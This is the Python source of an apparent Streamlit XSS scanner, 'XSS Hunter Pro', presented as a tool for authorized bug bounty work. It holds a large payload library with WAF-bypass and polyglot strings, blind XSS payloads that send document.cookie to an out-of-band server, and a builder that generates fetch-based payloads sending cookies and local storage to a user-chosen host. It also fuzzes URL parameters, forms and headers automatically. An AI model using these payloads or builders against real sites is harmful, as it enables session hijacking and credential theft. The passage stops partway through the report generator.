#!/usr/bin/env python3
"""
XSS Hunter Pro — by zwanski
Professional XSS scanner for authorized bug bounty testing
Run: streamlit run xss_hunter.py
"""

import streamlit as st
import requests
import json
import time
import re
import html
import base64
import hashlib
import random
import string
import pandas as pd
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse, urljoin, quote
)
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

st.set_page_config(
    page_title="XSS Hunter Pro — zwanski",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ── Styles ─────────────────────────────────────────────
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;600;700&display=swap');
body,.stApp{background:#080c10!important;color:#e2e8f0;font-family:'Inter',sans-serif}
section[data-testid="stSidebar"]{background:#0d1117!important;border-right:1px solid #1a2332}
.stTextInput input,.stTextArea textarea,.stSelectbox select{background:#0d1117!important;color:#e2e8f0!important;border-color:#1a2332!important}
.card{background:#0d1117;border:1px solid #1a2332;border-radius:8px;padding:16px 20px;margin-bottom:10px}
.card.crit{border-left:3px solid #ff3c5c}.card.high{border-left:3px solid #f97316}
.card.med{border-left:3px solid #fbbf24}.card.info{border-left:3px solid #0ea5e9}
.card.ok{border-left:3px solid #00ff9d}
.find-card{border-radius:8px;padding:14px;margin-bottom:8px;border:1px solid}
.badge{display:inline-block;padding:2px 10px;border-radius:99px;font-size:0.72rem;font-family:monospace;font-weight:600;margin-right:6px}
.mono{font-family:'Share Tech Mono',monospace;font-size:0.82rem}
pre.payload{background:#060a0d;border:1px solid #1a2332;border-radius:6px;padding:10px;font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:#00ff9d;overflow-x:auto;word-break:break-all}
.progress-bar{height:4px;background:#1a2332;border-radius:2px;margin:6px 0}
.progress-fill{height:4px;border-radius:2px;background:#00ff9d;transition:width 0.3s}
.stat{background:#0d1117;border:1px solid #1a2332;border-radius:8px;padding:14px;text-align:center}
.stat-val{font-family:'Share Tech Mono',monospace;font-size:1.8rem;font-weight:700;color:#00ff9d}
.stat-lbl{font-size:0.72rem;color:#556170;letter-spacing:1px;text-transform:uppercase}
</style>
""", unsafe_allow_html=True)

# ── Payload database ────────────────────────────────────
PAYLOADS = {
    "Basic Reflected": [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.cookie)</script>",
    ],
    "Image/Event": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        '<img src=x onerror="alert`1`">',
        "<img src=x onerrOR=alert(1)>",
        '<img/src=x onerror=alert(1)>',
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ],
    "SVG": [
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set attributeName=onmouseover value=alert(1)>",
        "<svg><use href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>#x'/>",
    ],
    "Attribute Breakout": [
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "' onerror='alert(1)' src='",
        '`onmouseover=alert(1)`',
        '" autofocus onfocus="alert(1)"',
    ],
    "DOM XSS": [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "#javascript:alert(1)",
        "'-alert(1)-'",
        '";alert(1);//',
    ],
    "HTML5": [
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle='alert(1)'>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "WAF Bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<<script>alert(1)</script>",
        "<script>alert`1`</script>",
        "<script>(alert)(1)</script>",
        "<script>window['ale'+'rt'](1)</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>alert?.(`xss`)</script>",
        "<!--<img src=x-->onerror=alert(1)>",
        '<iframe/src="jAvAsCrIpT:alert(1)">',
        "<object data='data:text/html,<script>alert(1)</script>'>",
        "<img src=x onerror=\x61lert(1)>",
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<script>alert(1)<!--",
        "</script><script>alert(1)</script>",
        "<script\x20type='text/javascript'>alert(1)</script>",
        "<script\x0d\x0a>alert(1)</script>",
    ],
    "Template/Context": [
        "{{constructor.constructor('alert(1)')()}}",  # AngularJS
        "${alert(1)}",                                 # Template literal
        "#{alert(1)}",                                 # Ruby ERB style
        "<%=alert(1)%>",                               # EJS
        "{alert(1)}",
        "[[alert(1)]]",
        "{{7*7}}",                                     # SSTI probe
        "<%= 7*7 %>",
    ],
    "JSON Breakout": [
        '"};</script><script>alert(1)</script>',
        '\\"><script>alert(1)</script>',
        '\'"--><svg onload=alert(1)>',
        '};alert(1);//',
        '<script>alert(1)</script>',
    ],
    "CSS Injection": [
        "</style><script>alert(1)</script>",
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<link rel=stylesheet href="data:,*{x:expression(alert(1))}">',
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>',
    ],
    "Blind XSS (OOB)": [
        # These use a marker that will be replaced with the OOB URL
        '"><script src="OOB_URL"></script>',
        "<script>fetch('OOB_URL/?c='+document.cookie)</script>",
        '<img src="OOB_URL/?x=1">',
        "<script>new Image().src='OOB_URL/?c='+document.cookie</script>",
        '<script>var i=new Image;i.src="OOB_URL/?"+document.cookie;</script>',
        "javascript:fetch('OOB_URL/?c='+document.cookie)",
    ],
    "Polyglots": [
        "jaVasCript:alert(1)//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/oNloAd=alert()>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\"></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "\"><<SCRIPT>alert('XSS');//<</SCRIPT>",
    ],
}

HEADER_PAYLOADS = {
    "User-Agent": "<script>alert(1)</script>",
    "Referer": "<script>alert(1)</script>",
    "X-Forwarded-For": "<script>alert(1)</script>",
    "X-Real-IP": "1.1.1.1<script>alert(1)</script>",
    "X-Forwarded-Host": "evil.com",
    "Origin": "https://evil.com",
    "X-Custom-Header": "<svg onload=alert(1)>",
}

# ── Session state ────────────────────────────────────────
for k, v in [
    ("findings", []),
    ("scan_log", []),
    ("scanning", False),
    ("scan_done", False),
    ("total_tested", 0),
    ("waf_detected", False),
    ("waf_type", ""),
]:
    if k not in st.session_state:
        st.session_state[k] = v

# ── Core scanner functions ──────────────────────────────

def make_session(cookies="", headers_extra=""):
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    if cookies:
        for c in cookies.strip().split(";"):
            c = c.strip()
            if "=" in c:
                k, v = c.split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    if headers_extra:
        for line in headers_extra.strip().splitlines():
            if ": " in line:
                k, v = line.split(": ", 1)
                s.headers[k.strip()] = v.strip()
    return s


def detect_waf(url, session):
    """Send a known bad payload and detect WAF from response."""
    try:
        r = session.get(
            url + ("&" if "?" in url else "?") + "xss_probe=<script>alert(1)</script>",
            timeout=10, verify=False, allow_redirects=False
        )
        waf_headers = {
            "x-sucuri-id": "Sucuri",
            "x-firewall-protection": "Cloudflare WAF",
            "x-akamai-transformed": "Akamai",
            "x-protected-by": "Generic WAF",
            "server": None,
        }
        for h, name in waf_headers.items():
            if h in [x.lower() for x in r.headers]:
                val = r.headers.get(h, "")
                if "cloudflare" in val.lower(): return "Cloudflare"
                if "akamai" in val.lower(): return "Akamai"
                if "sucuri" in val.lower(): return "Sucuri"
                if "imperva" in val.lower(): return "Imperva"
                if "f5" in val.lower(): return "F5 BIG-IP"
                if "barracuda" in val.lower(): return "Barracuda"
        if r.status_code in [403, 406, 429, 501]:
            return "Unknown WAF"
        server = r.headers.get("Server", "")
        if any(w in server for w in ["cloudflare", "AkamaiGHost", "nginx-protected"]):
            return server
    except Exception:
        pass
    return ""


def inject_url_param(base_url, param, payload):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def check_reflection(response_text, payload):
    """Check how payload appears in response — raw, encoded, partial."""
    if not response_text:
        return None, 0

    score = 0
    context = "none"

    # Raw reflection (highest confidence)
    if payload in response_text:
        score = 90
        # Determine context
        idx = response_text.find(payload)
        before = response_text[max(0, idx-50):idx].lower()
        if "<script" in before or "javascript" in before:
            context = "script"
            score = 95
        elif "href=" in before or "src=" in before or "action=" in before:
            context = "attribute"
            score = 85
        else:
            context = "html"
            score = 90

    # HTML-encoded reflection (lower confidence, might still be exploitable)
    elif html.escape(payload) in response_text:
        score = 20
        context = "html-encoded"

    # Partial reflection — key dangerous parts reflected
    else:
        dangerous = ["onerror=", "onload=", "<script", "javascript:", "onmouseover=", "onfocus="]
        for d in dangerous:
            if d in payload.lower() and d in response_text.lower():
                score = 40
                context = "partial"
                break

    return context, score


def check_execution_markers(response_text, marker):
    """Check if our unique marker appears in a way that suggests execution context."""
    if marker in response_text:
        idx = response_text.find(marker)
        surrounding = response_text[max(0, idx-200):idx+200]
        # Inside script tag → likely executable
        if "<script" in surrounding.lower():
            return True, "script-context"
        # Inside event handler
        if any(e in surrounding.lower() for e in ["onerror=", "onload=", "onclick="]):
            return True, "event-handler"
    return False, ""


def fuzz_url_params(url, session, payloads_flat, oob_url, delay, progress_cb=None):
    findings = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return findings

    total = len(params) * len(payloads_flat)
    done = 0

    for param in params:
        for payload in payloads_flat:
            # Replace OOB placeholder
            actual_payload = payload.replace("OOB_URL", oob_url) if oob_url else payload
            if "OOB_URL" in actual_payload and not oob_url:
                done += 1
                continue

            test_url = inject_url_param(url, param, actual_payload)
            try:
                r = session.get(test_url, timeout=10, verify=False)
                context, score = check_reflection(r.text, actual_payload)

                if score >= 40:
                    severity = "CRITICAL" if score >= 90 else "HIGH" if score >= 70 else "MEDIUM"
                    findings.append({
                        "type": "Reflected XSS",
                        "severity": severity,
                        "confidence": score,
                        "param": param,
                        "payload": actual_payload,
                        "url": test_url,
                        "context": context,
                        "status_code": r.status_code,
                        "response_length": len(r.text),
                        "timestamp": datetime.utcnow().isoformat(),
                        "vector": "URL Parameter",
                    })

                if delay > 0:
                    time.sleep(delay)
            except Exception as e:
                pass

            done += 1
            if progress_cb:
                progress_cb(done / total)

    return findings


def fuzz_forms(url, session, payloads_flat, oob_url, delay):
    findings = []
    try:
        r = session.get(url, timeout=10, verify=False)
        if r.status_code != 200:
            return findings

        # Extract forms using regex (no BeautifulSoup dep)
        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        action_pattern = re.compile(r'<form[^>]*action=["\']([^"\']*)["\']', re.IGNORECASE)
        method_pattern = re.compile(r'<form[^>]*method=["\']([^"\']*)["\']', re.IGNORECASE)

        forms = form_pattern.findall(r.text)
        raw_html = r.text

        for form_html in forms:
            inputs = input_pattern.findall(form_html) + textarea_pattern.findall(form_html)
            if not inputs:
                continue

            action_m = action_pattern.search(form_html)
            action = action_m.group(1) if action_m else url
            if action and not action.startswith("http"):
                action = urljoin(url, action)
            if not action:
                action = url

            method_m = method_pattern.search(form_html)
            method = method_m.group(1).upper() if method_m else "GET"

            for field in inputs:
                for payload in payloads_flat[:30]:  # Limit per form field
                    actual_payload = payload.replace("OOB_URL", oob_url) if oob_url else payload
                    if "OOB_URL" in actual_payload and not oob_url:
                        continue

                    data = {inp: "fuzz" for inp in inputs}
                    data[field] = actual_payload

                    try:
                        if method == "POST":
                            resp = session.post(action, data=data, timeout=10, verify=False)
                        else:
                            resp = session.get(action, params=data, timeout=10, verify=False)

                        context, score = check_reflection(resp.text, actual_payload)
                        if score >= 40:
                            severity = "CRITICAL" if score >= 90 else "HIGH" if score >= 70 else "MEDIUM"
                            findings.append({
                                "type": "Form XSS",
                                "severity": severity,
                                "confidence": score,
                                "param": field,
                                "payload": actual_payload,
                                "url": action,
                                "context": context,
                                "method": method,
                                "status_code": resp.status_code,
                                "response_length": len(resp.text),
                                "timestamp": datetime.utcnow().isoformat(),
                                "vector": f"Form Field ({method})",
                            })

                        if delay > 0:
                            time.sleep(delay)
                    except Exception:
                        pass
    except Exception as e:
        pass

    return findings


def fuzz_headers(url, session, delay):
    findings = []
    try:
        for header, payload in HEADER_PAYLOADS.items():
            headers = {header: payload}
            r = session.get(url, headers=headers, timeout=10, verify=False)
            context, score = check_reflection(r.text, payload)
            if score >= 40:
                findings.append({
                    "type": "Header Injection XSS",
                    "severity": "HIGH",
                    "confidence": score,
                    "param": header,
                    "payload": payload,
                    "url": url,
                    "context": context,
                    "status_code": r.status_code,
                    "response_length": len(r.text),
                    "timestamp": datetime.utcnow().isoformat(),
                    "vector": f"HTTP Header ({header})",
                })
            if delay > 0:
                time.sleep(delay)
    except Exception:
        pass
    return findings


def crawl_links(url, session, max_links=30):
    """Extract all links from a page for deeper scanning."""
    links = set()
    try:
        r = session.get(url, timeout=10, verify=False)
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        href_pattern = re.compile(r'href=["\']([^"\'#]*)["\']', re.IGNORECASE)
        for href in href_pattern.findall(r.text):
            if href.startswith("http"):
                if urlparse(href).netloc == urlparse(url).netloc:
                    links.add(href)
            elif href.startswith("/"):
                links.add(base + href)
        # Only keep URLs with parameters
        param_links = [l for l in links if "?" in l]
        return list(param_links)[:max_links]
    except Exception:
        return []


def generate_unique_marker():
    return "XSSMARK" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ── Sidebar ─────────────────────────────────────────────
with st.sidebar:
    st.markdown("## ⚡ XSS Hunter Pro")
    st.markdown('<span style="font-family:monospace;font-size:0.72rem;color:#556170">by zwanski · authorized testing only</span>', unsafe_allow_html=True)
    st.divider()

    page = st.radio("Navigation", [
        "🎯 Scanner",
        "📋 Findings",
        "🧬 Payload Lab",
        "📊 Report",
        "📖 Cheatsheet",
    ], label_visibility="collapsed")

    st.divider()

    # Global stats in sidebar
    total_findings = len(st.session_state.findings)
    crits = sum(1 for f in st.session_state.findings if f.get("severity") == "CRITICAL")
    highs = sum(1 for f in st.session_state.findings if f.get("severity") == "HIGH")

    if total_findings:
        st.markdown(f"**🔴 CRITICAL:** {crits}")
        st.markdown(f"**🟠 HIGH:** {highs}")
        st.markdown(f"**Total:** {total_findings}")
        if st.button("🗑️ Clear findings"):
            st.session_state.findings = []
            st.session_state.scan_log = []
            st.rerun()
    else:
        st.markdown("No findings yet")


# ════════════════════════════════════════════════════════
# PAGE: SCANNER
# ════════════════════════════════════════════════════════
if page == "🎯 Scanner":
    st.markdown("## ⚡ XSS Scanner")
    st.markdown('<div class="card info"><span style="font-family:monospace;font-size:0.78rem">⚠️ For authorized bug bounty targets only. Always add your program tracking header.</span></div>', unsafe_allow_html=True)

    # Config
    col1, col2 = st.columns([2, 1])
    with col1:
        target_url = st.text_input(
            "Target URL",
            placeholder="https://target.com/search?q=test",
            help="Include at least one parameter for URL scanning"
        )
    with col2:
        scan_mode = st.selectbox("Scan Mode", [
            "Quick (URL params only)",
            "Standard (URL + Forms)",
            "Deep (URL + Forms + Headers + Crawl)",
            "Stealth (slow, WAF evasion)",
        ])

    col3, col4, col5 = st.columns(3)
    with col3:
        cookies = st.text_input("Cookies", placeholder="session=abc123; token=xyz", help="Semicolon-separated")
    with col4:
        oob_url = st.text_input("OOB/Blind XSS Server", placeholder="https://your.interactsh.server", help="For blind XSS payloads")
    with col5:
        extra_headers = st.text_area("Extra Headers", placeholder="X-Bug-Bounty: zwanski\nAuthorization: Bearer token", height=80)

    col6, col7, col8 = st.columns(3)
    with col6:
        delay = st.slider("Delay (ms)", 0, 2000, 200, 50, help="Between requests — increase for rate limiting") / 1000
    with col7:
        threads = st.slider("Threads", 1, 10, 3)
    with col8:
        crawl_depth = st.slider("Crawl depth (links)", 0, 50, 10)

    # Payload category selection
    st.markdown("**Payload Categories**")
    cat_cols = st.columns(4)
    selected_cats = []
    all_cats = list(PAYLOADS.keys())
    for i, cat in enumerate(all_cats):
        with cat_cols[i % 4]:
            default = cat not in ["CSS Injection", "Polyglots", "Template/Context"]
            if st.checkbox(cat, value=default, key=f"cat_{i}"):
                selected_cats.append(cat)

    # Build payload list
    payloads_flat = []
    for cat in selected_cats:
        payloads_flat.extend(PAYLOADS[cat])
    # Deduplicate
    payloads_flat = list(dict.fromkeys(payloads_flat))

    st.markdown(f'<span style="font-family:monospace;font-size:0.78rem;color:#556170">→ {len(payloads_flat)} payloads selected from {len(selected_cats)} categories</span>', unsafe_allow_html=True)

    # Scan button
    st.markdown("")
    run_scan = st.button("⚡ START SCAN", type="primary", disabled=not target_url)

    if run_scan and target_url:
        st.session_state.findings = []
        st.session_state.scan_log = []
        st.session_state.scan_done = False
        st.session_state.total_tested = 0

        session = make_session(cookies, extra_headers)

        # Status area
        status = st.empty()
        progress_bar = st.empty()
        log_area = st.empty()
        results_area = st.empty()

        log = []

        def add_log(msg):
            log.append(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")
            log_area.code("\n".join(log[-20:]), language=None)

        add_log(f"Starting scan: {target_url}")
        add_log(f"Mode: {scan_mode} | Payloads: {len(payloads_flat)} | Delay: {delay*1000:.0f}ms")

        # WAF detection
        status.info("🔍 Detecting WAF...")
        waf = detect_waf(target_url, session)
        if waf:
            add_log(f"⚠️ WAF detected: {waf}")
            st.session_state.waf_detected = True
            st.session_state.waf_type = waf
        else:
            add_log("✅ No WAF detected")
            st.session_state.waf_detected = False

        all_findings = []

        # Phase 1: URL parameter fuzzing
        status.info("📡 Phase 1: URL parameter fuzzing...")
        progress_bar.progress(0.0)

        def prog_cb(pct):
            progress_bar.progress(min(pct * 0.4, 0.4))

        findings_url = fuzz_url_params(
            target_url, session, payloads_flat, oob_url, delay, prog_cb
        )
        all_findings.extend(findings_url)
        add_log(f"URL params: {len(findings_url)} potential findings")
        for f in findings_url:
            add_log(f"  [{f['severity']}] {f['context']} — {f['payload'][:50]}")

        # Phase 2: Form fuzzing
        if "Standard" in scan_mode or "Deep" in scan_mode or "Stealth" in scan_mode:
            status.info("📋 Phase 2: Form fuzzing...")
            progress_bar.progress(0.4)
            findings_forms = fuzz_forms(target_url, session, payloads_flat, oob_url, delay)
            all_findings.extend(findings_forms)
            add_log(f"Forms: {len(findings_forms)} potential findings")

        # Phase 3: Header injection
        if "Deep" in scan_mode or "Stealth" in scan_mode:
            status.info("📨 Phase 3: Header injection testing...")
            progress_bar.progress(0.6)
            findings_headers = fuzz_headers(target_url, session, delay)
            all_findings.extend(findings_headers)
            add_log(f"Headers: {len(findings_headers)} potential findings")

        # Phase 4: Crawl and test linked pages
        if ("Deep" in scan_mode or "Stealth" in scan_mode) and crawl_depth > 0:
            status.info(f"🕷️ Phase 4: Crawling linked pages (max {crawl_depth})...")
            progress_bar.progress(0.75)
            links = crawl_links(target_url, session, crawl_depth)
            add_log(f"Found {len(links)} linked pages with parameters")
            for i, link in enumerate(links):
                add_log(f"  Scanning: {link[:80]}")
                lf = fuzz_url_params(link, session, payloads_flat[:20], oob_url, delay)
                all_findings.extend(lf)
                progress_bar.progress(0.75 + (i / max(len(links), 1)) * 0.2)

        # Deduplicate findings
        seen = set()
        unique = []
        for f in all_findings:
            key = f"{f['param']}::{f['payload'][:40]}::{f.get('context','')}"
            if key not in seen:
                seen.add(key)
                unique.append(f)

        st.session_state.findings = unique
        st.session_state.scan_done = True
        progress_bar.progress(1.0)

        crit = sum(1 for f in unique if f["severity"] == "CRITICAL")
        high = sum(1 for f in unique if f["severity"] == "HIGH")
        med  = sum(1 for f in unique if f["severity"] == "MEDIUM")

        add_log(f"✅ Scan complete: {len(unique)} unique findings (CRIT:{crit} HIGH:{high} MED:{med})")

        if unique:
            status.error(f"🚨 {len(unique)} findings — {crit} CRITICAL, {high} HIGH, {med} MEDIUM")
        else:
            status.success("✅ Scan complete — no XSS candidates found")


# ════════════════════════════════════════════════════════
# PAGE: FINDINGS
# ════════════════════════════════════════════════════════
elif page == "📋 Findings":
    st.markdown("## 📋 Findings")

    findings = st.session_state.findings

    if not findings:
        st.info("No findings yet — run a scan first.")
    else:
        # Summary stats
        crit = [f for f in findings if f["severity"] == "CRITICAL"]
        high = [f for f in findings if f["severity"] == "HIGH"]
        med  = [f for f in findings if f["severity"] == "MEDIUM"]

        c1, c2, c3, c4 = st.columns(4)
        with c1: st.markdown(f'<div class="stat"><div class="stat-val" style="color:#ff3c5c">{len(crit)}</div><div class="stat-lbl">Critical</div></div>', unsafe_allow_html=True)
        with c2: st.markdown(f'<div class="stat"><div class="stat-val" style="color:#f97316">{len(high)}</div><div class="stat-lbl">High</div></div>', unsafe_allow_html=True)
        with c3: st.markdown(f'<div class="stat"><div class="stat-val" style="color:#fbbf24">{len(med)}</div><div class="stat-lbl">Medium</div></div>', unsafe_allow_html=True)
        with c4: st.markdown(f'<div class="stat"><div class="stat-val">{len(findings)}</div><div class="stat-lbl">Total</div></div>', unsafe_allow_html=True)

        st.markdown("")

        # Filter
        sev_filter = st.multiselect("Filter severity", ["CRITICAL", "HIGH", "MEDIUM"],
                                    default=["CRITICAL", "HIGH", "MEDIUM"])
        filtered = [f for f in findings if f["severity"] in sev_filter]

        for f in filtered:
            sev = f["severity"]
            col_map = {"CRITICAL": "#ff3c5c", "HIGH": "#f97316", "MEDIUM": "#fbbf24"}
            col = col_map.get(sev, "#0ea5e9")

            with st.expander(f"[{sev}] {f['type']} — param: {f['param']} | context: {f.get('context','?')} | confidence: {f['confidence']}%"):
                c1, c2 = st.columns(2)
                with c1:
                    st.markdown(f"**Vector:** {f.get('vector','URL Parameter')}")
                    st.markdown(f"**Parameter:** `{f['param']}`")
                    st.markdown(f"**Context:** {f.get('context','unknown')}")
                    st.markdown(f"**Confidence:** {f['confidence']}%")
                    st.markdown(f"**Status:** {f.get('status_code','?')}")
                with c2:
                    st.markdown(f"**Timestamp:** {f['timestamp']}")
                    st.markdown(f"**Response length:** {f.get('response_length','?')} bytes")
                    st.markdown(f"**Method:** {f.get('method','GET')}")

                st.markdown("**Payload:**")
                st.code(f["payload"], language=None)
                st.markdown("**Test URL:**")
                st.code(f["url"], language=None)

                # CVSS vector estimate
                if sev == "CRITICAL":
                    cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N — 6.1"
                elif sev == "HIGH":
                    cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N — 4.7"
                else:
                    cvss = "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N — 3.1"
                st.markdown(f"**Estimated CVSS:** `{cvss}`")


# ════════════════════════════════════════════════════════
# PAGE: PAYLOAD LAB
# ════════════════════════════════════════════════════════
elif page == "🧬 Payload Lab":
    st.markdown("## 🧬 Payload Lab")
    st.markdown("Test, encode, and craft payloads. Generate custom blind XSS with OOB callbacks.")

    tab1, tab2, tab3 = st.tabs(["🔧 Encoder", "🎯 Custom Payload Builder", "📚 Full Library"])

    with tab1:
        st.markdown("### Payload Encoder / Decoder")
        raw = st.text_area("Input payload", '<script>alert(1)</script>', height=80)
        enc_type = st.selectbox("Encoding", [
            "HTML Entities", "URL Encode", "Double URL", "Base64",
            "Unicode Escape", "Hex Escape", "JSFuck (partial)", "Char Code"
        ])

        result = raw
        if st.button("Encode"):
            if enc_type == "HTML Entities":
                result = html.escape(raw)
            elif enc_type == "URL Encode":
                result = quote(raw, safe="")
            elif enc_type == "Double URL":
                result = quote(quote(raw, safe=""), safe="")
            elif enc_type == "Base64":
                result = base64.b64encode(raw.encode()).decode()
                result = f'eval(atob("{result}"))'
            elif enc_type == "Unicode Escape":
                result = "".join(f"\\u{ord(c):04x}" for c in raw)
            elif enc_type == "Hex Escape":
                result = "".join(f"\\x{ord(c):02x}" for c in raw)
            elif enc_type == "Char Code":
                codes = ",".join(str(ord(c)) for c in raw)
                result = f"eval(String.fromCharCode({codes}))"

        st.code(result, language=None)
        st.caption("Copy encoded payload above ↑")

    with tab2:
        st.markdown("### Blind XSS Builder")
        oob = st.text_input("Your OOB server URL", placeholder="https://abc.interact.sh")
        target_field = st.text_input("Target field hint", placeholder="name, search, comment")
        exfil = st.multiselect("Exfiltrate", ["document.cookie", "document.domain",
                                               "localStorage", "sessionStorage",
                                               "document.referrer", "location.href"])

        if oob and st.button("Generate Blind XSS Payloads"):
            exfil_js = "+'.'+".join(exfil) if exfil else "document.cookie"
            payloads_blind = [
                f'<script>fetch("{oob}/?c="+{exfil_js})</script>',
                f'<script>new Image().src="{oob}/?c="+{exfil_js}</script>',
                f'<script src="{oob}/payload.js"></script>',
                f'<img src=x onerror="fetch(\'{oob}/?c=\'+{exfil_js})">',
                f'"><script>fetch("{oob}/?c="+{exfil_js})</script>',
                f"'><script>fetch('{oob}/?c='+{exfil_js})</script>",
                f'<svg onload="fetch(\'{oob}/?c=\'+{exfil_js})">',
                f'javascript:fetch("{oob}/?c="+{exfil_js})',
            ]
            for p in payloads_blind:
                st.code(p, language=None)

        st.divider()
        st.markdown("### WAF Bypass Generator")
        base_payload = st.text_input("Base payload", "<script>alert(1)</script>")
        if st.button("Generate Bypass Variants"):
            variants = [
                base_payload,
                base_payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
                base_payload.replace("alert", "al\\u0065rt"),
                base_payload.replace("alert(1)", "alert`1`"),
                base_payload.replace("alert(1)", "(alert)(1)"),
                base_payload.replace("alert(1)", "window['alert'](1)"),
                base_payload.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"),
                f"<!--\n{base_payload}\n-->",
                base_payload.replace("<", "&#60;").replace(">", "&#62;"),
                quote(base_payload),
            ]
            for v in variants:
                st.code(v, language=None)

    with tab3:
        st.markdown("### Full Payload Library")
        search = st.text_input("Search payloads", placeholder="svg, bypass, blind...")
        for cat, payloads in PAYLOADS.items():
            filtered_p = [p for p in payloads if not search or search.lower() in p.lower() or search.lower() in cat.lower()]
            if filtered_p:
                with st.expander(f"{cat} ({len(filtered_p)} payloads)"):
                    for p in filtered_p:
                        st.code(p, language=None)


# ════════════════════════════════════════════════════════
# PAGE: REPORT
# ════════════════════════════════════════════════════════
elif page == "📊 Report":
    st.markdown("## 📊 Bug Bounty Report Generator")

    findings = st.session_state.findings
    if not findings:
        st.info("No findings yet — run a scan first.")
    else:
        target_in = st.text_input("Target (for report)", "target.com")
        program = st.text_input("Bug bounty program", "HackerOne / Bugcrowd / BBS")
        hunter = st.text_input("Researcher", "Mohamed Ibrahim (zwanski)")

        if st.button("📋 Generate Report"):
            crit = [f for f in findings if f["severity"] == "CRITICAL"]
            high = [f for f in findings if f["severity"] == "HIGH"]
            med  = [f for f in findings if f["severity"] == "MEDIUM"]

            now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")

            report = f"""# XSS Vulnerability Report
**Target:** {target_in}  
**Program:** {program}  
**Researcher:** {hunter}  
**Date:** {now}  
**Tool:** XSS Hunter Pro by zwanski

---

## Executive Summary

{len(findings)} cross-site scripting vulnerabilities were identified during authorized security testing of **{target_in}**.

| Severity | Count |
|---|---|
| 🔴 Critical | {len(crit)} |
| 🟠 High | {len(high)} |
| 🟡 Medium | {len(med)} |

---

## Findings

"""
            for i, f in enumerate(findings, 1):
                report += f"""### Finding {i}: {f['type']} — {f['severity']}

**Parameter:** `{f['param']}`  
**Vector:** {f.get('vector', 'URL Parameter')}  
**Context:** {f.get('context', 'unknown')}  
**Confidence:** {f['confidence']}%  
**Timestamp:** {f['timestamp']}

**Payload:**
```
{f['payload']}
```

**Test URL:**
```
{f['url']}
```

**Impact:**  
An attacker can inject and execute arbitrary JavaScript in the context of the victim's browser session,
enabling session hijacking, credential theft, DOM manipulation, phishing, and keylogging.

**Remediation:**  
1. Implement context-aware output encoding (HTML, attribute, JavaScript, URL context)
2. Apply Content-Security-Policy (CSP) headers
3. Validate and sanitize all user-supplied input server-side
4. Use a security-focused template engine with auto-escaping

---

"""
